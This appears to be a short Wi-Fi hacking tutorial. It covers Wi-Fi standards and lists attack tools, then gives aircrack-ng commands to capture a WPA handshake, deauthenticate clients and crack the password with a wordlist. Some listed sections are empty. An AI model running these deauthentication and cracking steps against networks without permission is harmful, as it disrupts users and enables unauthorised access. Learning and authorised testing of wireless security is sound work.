Wi-Fi Hacking Guide

Table of Contents

1. Introduction to Wi-Fi


2. Wi-Fi Generations & Key Terminologies


3. Networking Essentials for Wi-Fi Hacking


4. Tools for Wi-Fi Hacking

Aircrack-ng Suite (Complete Guide)



5. Best Wi-Fi Adapters for Hacking


6. Wi-Fi Attack Scenarios


7. External Resources




---

Introduction to Wi-Fi

Wi-Fi (Wireless Fidelity) is a technology that enables devices to connect wirelessly to a network using radio waves. It operates on different frequency bands (2.4GHz & 5GHz) and follows IEEE 802.11 standards.

Wi-Fi Generations & Key Terminologies

Wi-Fi Generations

802.11b: First widely adopted Wi-Fi standard (2.4GHz, 11Mbps).

802.11a: Operates on 5GHz, faster but less range.

802.11g: Improved speed at 2.4GHz (54Mbps).

802.11n (Wi-Fi 4): Supports both 2.4GHz & 5GHz, higher speeds (600Mbps).

802.11ac (Wi-Fi 5): Optimized for 5GHz, gigabit speeds.

802.11ax (Wi-Fi 6): Better efficiency, supports multiple devices.


Key Terminologies

SSID (Service Set Identifier): Name of a Wi-Fi network.

BSSID (Basic Service Set Identifier): MAC address of the router/AP.

WEP (Wired Equivalent Privacy): Insecure encryption method.

WPA/WPA2/WPA3 (Wi-Fi Protected Access): Secure encryption protocols.

Monitor Mode: Allows packet sniffing on Wi-Fi networks.


Networking Essentials for Wi-Fi Hacking

Understanding the following networking concepts is crucial:

IP Addressing: Identifying devices on a network.

MAC Address: Unique ID for network interfaces.

DHCP & DNS: Assigns and resolves network addresses.

Subnetting: Organizing IP address ranges.

OSI Model: Standard framework for network communication.


Tools for Wi-Fi Hacking

Popular Tools:

Aircrack-ng: Packet capturing & password cracking.

Kismet: Wireless network detector & sniffer.

Wireshark: Network protocol analyzer.

Reaver: WPS attack tool.

Wifite: Automated Wi-Fi attack suite.


Aircrack-ng Suite (Complete Guide)

Installation (Debian-based Linux):

sudo apt update
sudo apt install aircrack-ng

Capturing Handshakes:

1. Enable Monitor Mode:

airmon-ng start wlan0


2. Scan for networks:

airodump-ng wlan0mon


3. Capture handshake:

airodump-ng --bssid [BSSID] -c [CH] -w capture wlan0mon


4. Deauth to force handshake:

aireplay-ng --deauth 10 -a [BSSID] wlan0mon


5. Crack Password:

aircrack-ng -w [WORDLIST] -b [BSSID] capture.cap



Best Wi-Fi Adapters for Hacking

Wi-Fi Attack Scenarios

External Resources

Aircrack-ng Documentation

Kali Linux Wireless Attacks Guide

Wi-Fi Security Research Papers



---

Disclaimer: This guide is for educational purposes only. Unauthorized access to networks is illegal. Always get permission before performing security tests.

